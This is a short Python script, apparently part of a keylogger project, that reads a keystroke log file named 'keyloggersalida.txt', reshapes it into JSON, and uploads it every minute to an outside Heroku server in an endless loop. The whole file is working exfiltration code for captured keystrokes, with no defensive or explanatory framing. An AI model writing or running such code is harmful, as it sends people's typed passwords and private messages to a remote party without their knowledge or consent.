import json
import urllib.request
import ast
import schedule
import time
def job():
    with open("keyloggersalida.txt", encoding="utf8", errors='ignore') as f:
        contents = f.read()
        f.close()
    datos=contents 
    datoss=datos.split("\r")
    datosss=str(datoss).replace("'", "").replace("\\n", "")
    datossss='{'+datosss[1:-3]+'}'+str(']')+'}'
    datossss=ast.literal_eval(datossss)
    body =  datossss
    myurl = "https://sistemasop-fiis.herokuapp.com/test"
    req = urllib.request.Request(myurl)
    req.add_header('Content-Type', 'application/json; charset=utf-8')
    jsondata = json.dumps(body)
    jsondataasbytes = jsondata.encode('utf-8')   
    req.add_header('Content-Length', len(jsondataasbytes))
    response = urllib.request.urlopen(req, jsondataasbytes)
schedule.every(1).minutes.do(job)
while 1:
    schedule.run_pending()
